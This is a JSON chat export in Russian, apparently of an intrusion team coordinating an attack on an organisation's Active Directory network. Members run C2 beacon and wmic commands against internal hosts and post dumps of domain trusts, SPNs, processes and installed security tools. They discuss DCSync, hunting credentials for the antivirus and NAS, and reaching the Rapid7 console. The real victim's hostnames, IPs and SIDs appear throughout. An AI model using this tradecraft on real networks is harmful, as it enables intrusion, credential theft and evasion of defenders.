+          "image_preview": "/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAgAB0DASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAgMEBQABB//EACYQAAEEAQMDBAMAAAAAAAAAAAIAAQMEEQUSIRMxQSMyM1E0cYH/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/xAAcEQACAQUBAAAAAAAAAAAAAAAAARICERMhUUH/2gAMAwEAAhEDEQA/AOOhdtSWDF5iwyy1fsQDueY3y/hQgy9k8bv4l389Pnd38oApNWnf2ySIY9SuFn1iVepUZA8YsPDt3QE6r+VIh1b4W/a305o7J7QdKujPIDMQ+VqL4WL4VqfWFiYs/adHp0sgu444+0Y6dOLcO3KuOp+GW7aP/9k=",
+          "image_url": "/file-upload/g4JWsKYGLrY9qxMLx/Clipboard%20-%208%20%D0%BE%D0%BA%D1%82%D1%8F%D0%B1%D1%80%D1%8F%202020%20%D0%B3.,%2000:35",
+          "image_type": "image/png",
+          "image_size": 224475,
+          "type": "file",
+          "description": "вс?"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:35:30.098Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dyzeFMcYcMRQ25Z3H",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "кинь полные хостнеймы с группами",
+      "ts": "2020-10-07T21:35:05.181Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:35:05.215Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Td6cjYKBWdNbmyyea",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "MX да",
+      "ts": "2020-10-07T21:34:12.157Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:34:12.190Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nT22ETuf4NrGtrcb4",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ускорило бы процесс работы",
+      "ts": "2020-10-07T21:33:01.551Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:33:01.585Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kdXvE6gdcippZELNc",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "встречаются уже не первый раз",
+      "ts": "2020-10-07T21:32:50.700Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:32:50.728Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MEvaptK24zPY3sqAj",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "и ещё, на что указывают:\nFPS\nMGW\nARP\nSCM\nSEC\nSPH\n?",
+      "ts": "2020-10-07T21:32:42.103Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:32:42.146Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sqkdERayF8fvrYpZa",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\n\tUSHDC1-360MX2.datacenter.local\n\tUSHDC1-360MX1.datacenter.local\n``` \nЭти в эксчейнж, выходит?",
+      "ts": "2020-10-07T21:31:48.566Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:31:48.633Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KaCew3kCbrSCRycTt",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "тут в сети стоит rapid7 \nнадо ан машинах теханрей поискать доступ в его консоль",
+      "ts": "2020-10-07T21:31:00.611Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:31:00.644Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "89FgLGnn4jrGRijor",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "укажи его...",
+      "ts": "2020-10-07T21:30:38.016Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:30:38.051Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jcdD7qcpy98kKBQNJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "как file server",
+      "ts": "2020-10-07T21:30:35.932Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:30:35.965Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8aYxtFnjMAF4c4acJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nImage Name                     PID Session Name        Session#    Mem Usage User Name                                              CPU Time\n========================= ======== ================ =========== ============ ================================================== ============\nSystem Idle Process              0 Services                   0          4 K NT AUTHORITY\\SYSTEM                                   827:32:16\nSystem                           4 Services                   0        264 K N/A                                                     5:43:18\nsmss.exe                       224 Services                   0      1,036 K NT AUTHORITY\\SYSTEM                                     0:00:00\ncsrss.exe                      340 Services                   0      3,964 K NT AUTHORITY\\SYSTEM                                     0:00:25\ncsrss.exe                      396 Console                    1      3,472 K NT AUTHORITY\\SYSTEM                                     0:00:00\nwininit.exe                    404 Services                   0      3,896 K NT AUTHORITY\\SYSTEM                                     0:00:00\nwinlogon.exe                   448 Console                    1      5,900 K NT AUTHORITY\\SYSTEM                                     0:00:00\nservices.exe                   492 Services                   0     10,908 K NT AUTHORITY\\SYSTEM                                     0:52:07\nlsass.exe                      500 Services                   0     17,576 K NT AUTHORITY\\SYSTEM                                     0:06:28\nsvchost.exe                    560 Services                   0      9,644 K NT AUTHORITY\\SYSTEM                                     0:01:19\nsvchost.exe                    592 Services                   0      9,244 K NT AUTHORITY\\NETWORK SERVICE                            0:03:50\nLogonUI.exe                    688 Console                    1     27,424 K NT AUTHORITY\\SYSTEM                                     0:00:00\nMsMpEng.exe                    700 Services                   0    243,516 K NT AUTHORITY\\SYSTEM                                     2:25:24\ndwm.exe                        712 Console                    1     30,044 K Window Manager\\DWM-1                                    0:00:00\nsvchost.exe                    816 Services                   0     15,376 K NT AUTHORITY\\LOCAL SERVICE                              0:08:36\nsvchost.exe                    844 Services                   0     15,452 K NT AUTHORITY\\SYSTEM                                     0:00:36\nsvchost.exe                    860 Services                   0     86,460 K NT AUTHORITY\\SYSTEM                                     1:19:39\nsvchost.exe                    912 Services                   0     12,748 K NT AUTHORITY\\LOCAL SERVICE                              0:00:25\nsvchost.exe                    992 Services                   0     21,736 K NT AUTHORITY\\NETWORK SERVICE                            0:05:02\nsvchost.exe                    532 Services                   0     11,000 K NT AUTHORITY\\LOCAL SERVICE                              0:00:29\nspoolsv.exe                   1108 Services                   0     13,520 K NT AUTHORITY\\SYSTEM                                     0:00:13\nsvchost.exe                   1148 Services                   0      7,856 K NT AUTHORITY\\SYSTEM                                     0:00:05\nir_agent.exe                  1172 Services                   0     13,176 K NT AUTHORITY\\SYSTEM                                     0:01:04\nconhost.exe                   1292 Services                   0      3,016 K NT AUTHORITY\\SYSTEM                                     0:00:02\nsnmp.exe                      1304 Services                   0      6,856 K NT AUTHORITY\\SYSTEM                                     0:03:05\nsvchost.exe                   1336 Services                   0     13,584 K NT AUTHORITY\\SYSTEM                                     0:00:59\nvmtoolsd.exe                  1352 Services                   0     13,800 K NT AUTHORITY\\SYSTEM                                     0:09:42\nir_agent.exe                  1372 Services                   0     63,968 K NT AUTHORITY\\SYSTEM                                     1:09:54\nWmiApSrv.exe                  1460 Services                   0      8,472 K NT AUTHORITY\\SYSTEM                                     0:01:01\nwmi_exporter.exe              1484 Services                   0     16,032 K NT AUTHORITY\\SYSTEM                                     0:00:32\nWmiPrvSE.exe                  1624 Services                   0     23,088 K NT AUTHORITY\\NETWORK SERVICE                            1:55:27\nWmiPrvSE.exe                  1640 Services                   0     48,744 K NT AUTHORITY\\SYSTEM                                     0:31:54\nsvchost.exe                   1908 Services                   0      8,936 K NT AUTHORITY\\NETWORK SERVICE                            0:00:31\nsvchost.exe                   2012 Services                   0      4,792 K NT AUTHORITY\\NETWORK SERVICE                            0:00:02\ndllhost.exe                   2132 Services                   0     11,008 K NT AUTHORITY\\SYSTEM                                     0:00:04\nmsdtc.exe                     2484 Services                   0      7,336 K NT AUTHORITY\\NETWORK SERVICE                            0:00:04\nWmiPrvSE.exe                  2572 Services                   0     29,720 K NT AUTHORITY\\SYSTEM                                     0:19:40\nCcmExec.exe                   3696 Services                   0    113,032 K NT AUTHORITY\\SYSTEM                                     0:11:09\nWmiPrvSE.exe                  3804 Services                   0     13,636 K NT AUTHORITY\\SYSTEM                                     0:00:37\nir_agent.exe                  3964 Services                   0     92,692 K NT AUTHORITY\\SYSTEM                                     0:40:51\nir_agent.exe                  3972 Services                   0     63,404 K NT AUTHORITY\\SYSTEM                                     0:25:50\nir_agent.exe                  4016 Services                   0     47,476 K NT AUTHORITY\\SYSTEM                                     0:06:02\nCmRcService.exe               1648 Services                   0      8,784 K NT AUTHORITY\\SYSTEM                                     0:00:14\nWmiPrvSE.exe                  3320 Services                   0      6,708 K NT AUTHORITY\\LOCAL SERVICE                              0:00:01\nWmiPrvSE.exe                  3048 Services                   0     10,388 K NT AUTHORITY\\LOCAL SERVICE                              0:02:01\nir_agent.exe                  2832 Services                   0     55,420 K NT AUTHORITY\\SYSTEM                                     0:06:02\nir_agent.exe                  2392 Services                   0     51,596 K NT AUTHORITY\\SYSTEM                                     0:26:38\nxagt.exe                      3944 Services                   0      7,272 K NT AUTHORITY\\SYSTEM                                     0:00:02\nWmiPrvSE.exe                  3280 Services                   0      8,820 K NT AUTHORITY\\LOCAL SERVICE                              0:00:00\nWmiPrvSE.exe                  3600 Services                   0      8,176 K NT AUTHORITY\\SYSTEM                                     0:00:00\nWmiPrvSE.exe                  3396 Services                   0     12,148 K NT AUTHORITY\\SYSTEM                                     0:00:00\nmsiexec.exe                   2712 Services                   0      5,868 K NT AUTHORITY\\SYSTEM                                     0:00:00\n\n```",
+      "ts": "2020-10-07T21:28:15.123Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:28:15.684Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZYGr3oiCG8yY2TPFP",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "покажи пиды пожалуйста",
+      "ts": "2020-10-07T21:28:00.224Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:28:00.269Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5kzRmgyAkhmekejmv",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "путано очень...",
+      "ts": "2020-10-07T21:27:45.606Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:27:45.628Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SZmjwXCaQitjd9DHK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "DC - указание на домен контроллер\nFS - указание на файловый сервер\n360 - указание на эксчендж вообще, точнее на ССО авторизацию через офис360",
+      "ts": "2020-10-07T21:27:40.817Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:27:40.859Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Mg793CivzqXPvraFY",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "у этой тачки",
+      "ts": "2020-10-07T21:27:09.004Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:27:09.035Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "j6evq8j8QB98zWDL5",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а у него один интерфейс?",
+      "ts": "2020-10-07T21:27:07.886Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:27:07.932Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DXWDZAB3sh9ussqfq",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "у дк же в спн лдапы, да и в оушке должно быть написано",
+      "ts": "2020-10-07T21:26:56.229Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:26:56.268Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "N9YQiz8YGBiBZfjgJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "не? )",
+      "ts": "2020-10-07T21:26:34.313Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:26:34.345Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pTDxz2fDScPPiCJm9",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "это домен контроллер....",
+      "ts": "2020-10-07T21:26:31.207Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:26:31.260Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xvd7sgzuTRwd8M6R6",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nCN=USHDC1-360FS1,OU=Production,OU=C360,OU=Servers,OU=0.SAI Global,DC=datacenter,DC=local\n\n>dNSHostName: USHDC1-360FS1.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-360FS1.datacenter.local\n>servicePrincipalName: CmRcService/USHDC1-360FS1\n>servicePrincipalName: WSMAN/USHDC1-360FS1.datacenter.local\n>servicePrincipalName: WSMAN/USHDC1-360FS1\n>servicePrincipalName: TERMSRV/USHDC1-360FS1\n>servicePrincipalName: TERMSRV/USHDC1-360FS1.datacenter.local\n>servicePrincipalName: RestrictedKrbHost/USHDC1-360FS1\n>servicePrincipalName: HOST/USHDC1-360FS1\n>servicePrincipalName: RestrictedKrbHost/USHDC1-360FS1.datacenter.local\n>servicePrincipalName: HOST/USHDC1-360FS1.datacenter.local\n```",
+      "ts": "2020-10-07T21:25:54.130Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:25:54.249Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZL6xjLZovSFN7Wbq2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "нууу наверное... \nа как хост назыается и какая у него ОУ / группа?",
+      "ts": "2020-10-07T21:25:12.769Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:25:12.808Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WNonx46xBPqTpCSgW",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "хм",
+      "ts": "2020-10-07T21:24:59.242Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:24:59.272Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Wpj3AZ2JJDtyvedf5",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в DEV могу внести?",
+      "ts": "2020-10-07T21:24:33.941Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:24:33.980Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "q9dTBvzQytJWQFpLj",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nName                                                            \n\nMicrosoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40660      \n\nMicrosoft Visual C++ 2010  x64 Redistributable - 10.0.40219     \n\nMicrosoft Visual C++ 2005 Redistributable (x64)                 \n\nVMware Tools                                                    \n\nMicrosoft Visual C++ 2012 x64 Minimum Runtime - 11.0.60610      \n\nMicrosoft Visual C++ 2012 x86 Minimum Runtime - 11.0.60610      \n\nMicrosoft Visual C++ 2013 x64 Additional Runtime - 12.0.40660   \n\nMicrosoft Visual C++ 2012 x64 Additional Runtime - 11.0.60610   \n\nWindows Firewall Configuration Provider                         \n\nMicrosoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  \n\nMicrosoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  \n\nMicrosoft Forefront Endpoint Protection 2010 Server Management  \n\nFireEye Endpoint Agent                                          \n\nMicrosoft Visual C++ 2013 x86 Additional Runtime - 12.0.40660   \n\nMicrosoft Visual C++ 2012 x86 Additional Runtime - 11.0.60610   \n\nConfiguration Manager Client                                    \n\nMicrosoft RichCopy 4.0                                          \n\nMicrosoft Endpoint Protection Management Components             \n\nMicrosoft Visual C++ 2013 x64 Minimum Runtime - 12.0.40660      \n\nMicrosoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  \n\nWindows Resource Kit Tools - SubInAcl.exe                       \n\nMicrosoft Silverlight                                           \n\nMicrosoft Security Client                                       \n\nMicrosoft Policy Platform                                       \n\nWMI Exporter                                                    \n\nRapid7 Insight Agent \n```",
+      "ts": "2020-10-07T21:24:27.236Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:24:27.479Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kwxPmqYEdWqD8m2E9",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "тоже отработало",
+      "ts": "2020-10-07T21:23:15.273Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:24:02.548Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T21:24:02.546Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "chYCY4rHfSHiQ28Y6",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nshell wmic /node:10.225.10.202 product get name\n```",
+      "ts": "2020-10-07T21:23:12.986Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:23:13.043Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2BfKfk763jXCu5MM4",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "и",
+      "ts": "2020-10-07T21:23:04.296Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:23:56.409Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-07T21:23:56.407Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "u9f2ufnZ7hghcpHHq",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "тасклист",
+      "ts": "2020-10-07T21:23:03.356Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:23:03.394Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qJQJWddNYmZE2ibTd",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "о под токеном выдало",
+      "ts": "2020-10-07T21:22:59.504Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:22:59.541Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Qe3fCojkDsJSXGSWR",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "попробуй вмиком\nможет порт закрыт...",
+      "ts": "2020-10-07T21:16:33.709Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:16:33.735Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Fi9RqA968gyXgWRSn",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "под токеном ?",
+      "ts": "2020-10-07T21:16:22.575Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:16:22.608Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "C4gPHNZzYLwEz5DmA",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell tasklist /s 10.225.10.202 /v\n[*] Tasked beacon to run: tasklist /s 10.225.10.202 /v\n[+] host called home, sent: 59 bytes\n```",
+      "ts": "2020-10-07T21:14:29.872Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:14:29.934Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qXFWjoQ8MH48ZzScb",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ага",
+      "ts": "2020-10-07T21:12:08.143Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:12:08.185Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mHSxauRupY9h9hGDh",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в прошлый раз не успел тасклисты запросить",
+      "ts": "2020-10-07T21:11:10.791Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:11:10.832Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "34vWbvFvhrwiGYngm",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "мне тут осталось те что внизу отсорировать",
+      "ts": "2020-10-07T21:10:50.891Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:10:50.921Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WcCm884ffWubWYpya",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "ts": "2020-10-07T21:10:37.483Z",
+      "msg": "",
+      "file": {
+        "_id": "3q7hpeZpbtbbuk9Nu",
+        "name": "pc_sort_groups.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "pc_sort_groups.txt",
+          "title_link": "/file-upload/3q7hpeZpbtbbuk9Nu/pc_sort_groups.txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "ты про это?"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:10:37.524Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vvfgJza5PgmkZrk5e",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ну и \"каталог серверов\" по назначению",
+      "ts": "2020-10-07T21:09:57.882Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:09:57.910Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MHe7uKgFaYPoCQB3h",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "верно",
+      "ts": "2020-10-07T21:09:46.472Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-07T21:09:46.508Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WuSryK95bEAMK9NWK",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "[ ](https://mediaeveryone.com/group/saiglobal-com?msg=foqLBWJKz6u69XSe4) 1",
+      "ts": "2020-10-07T21:09:15.957Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:09:16.004Z",
+      "attachments": [
+        {
+          "text": "теперь ищу креды от АВ и насы, правильно?",
+          "author_name": "user8",
+          "author_icon": "/avatar/user8",
+          "message_link": "https://mediaeveryone.com/group/saiglobal-com?msg=foqLBWJKz6u69XSe4",
+          "attachments": [],
+          "ts": "2020-10-07T21:03:21.593Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/saiglobal-com?msg=foqLBWJKz6u69XSe4",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DeS2iNG3xCEzKLo6W",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\ndn:CN=saig.frd.global,CN=System,DC=datacenter,DC=local\n>whenCreated: 2018/06/09-00:59:39 AUS Eastern Daylight Time\n>name: saig.frd.global\n>securityIdentifier: S-1-5-21-2959458370-3657645319-1944215935\n>trustDirection: 3 [Inbound(1);Outbound(2)]\n>trustPartner: saig.frd.global\n>trustType: 2 [UpLevel(2)]\n>trustAttributes: 4 [Quarantined-Domain(4)]\n\ndn:CN=frd.global,CN=System,DC=datacenter,DC=local\n>whenCreated: 2018/04/14-00:59:25 AUS Eastern Daylight Time\n>name: frd.global\n>securityIdentifier: S-1-5-21-2724714270-1340506477-316473475\n>trustDirection: 3 [Inbound(1);Outbound(2)]\n>trustPartner: frd.global\n>trustType: 2 [UpLevel(2)]\n>trustAttributes: 8 [Transitive(8)]\n```",
+      "ts": "2020-10-07T21:05:05.052Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:05:05.198Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qnoGXo8ghAtgoWKMF",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "в датацентре сняты:\nAdFind\nDA\nEA\nLA\nDC\nDCSync",
+      "ts": "2020-10-07T21:04:10.798Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:04:10.834Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aezHSqgWnubFYXaE2",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "трасты все сняты?",
+      "ts": "2020-10-07T21:03:34.795Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T21:03:34.828Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "foqLBWJKz6u69XSe4",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "теперь ищу креды от АВ и насы, правильно?",
+      "ts": "2020-10-07T21:03:21.593Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:03:21.630Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "D8mtSpR2JSRTSJQtN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "да)",
+      "ts": "2020-10-07T21:02:31.461Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T21:02:31.494Z",
